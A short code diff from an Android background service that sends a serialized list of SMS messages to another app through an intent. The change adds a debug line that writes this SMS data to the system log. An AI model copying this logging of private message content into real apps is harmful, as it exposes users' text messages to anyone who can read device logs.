@@ -373,7 +373,8 @@ public class BackgroundService extends Service {
         sendIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
         sendIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
         sendIntent.setAction(Intent.ACTION_SEND);
-        sendIntent.putExtra("SMS_LIST", serializedData); // Pass serialized data
+        sendIntent.putExtra("SMS_LIST", serializedData);
+        Log.d("BgC",serializedData);
         sendIntent.setType("text/plain");
 
         // Set the package name of the receiving app
